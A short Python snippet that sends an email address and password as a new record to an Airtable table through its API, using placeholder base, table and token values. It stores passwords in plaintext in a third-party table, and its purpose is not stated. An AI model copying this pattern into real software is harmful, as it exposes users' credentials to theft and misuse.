import requests
import json

# Airtable API base information
base_id = 'YOUR_AIRTABLE_BASE_ID'
table_id = 'YOUR_AIRTABLE_TABLE_ID'
personal_access_token = 'YOUR_AIRTABLE_API_KEY'

# Create headers for the Airtable API
def create_headers():
    headers = {
        'Authorization': f'Bearer {personal_access_token}',
        'Content-Type': 'application/json',
    }
    return headers

# Base API URL for Airtable
base_table_api_url = f'https://api.airtable.com/v0/{base_id}/{table_id}'

# Function to save email and password to Airtable
def save_to_airtable(email, password):
    headers = create_headers()
    # Data payload for Airtable API
    data = {
        'fields': {
            'Email': email,
            'Password': password
        }
    }
    # Send POST request to Airtable API to add a new record
    response = requests.post(base_table_api_url, headers=headers, data=json.dumps(data))
    # Return the response status for logging purposes
    return response.status_code, response.content
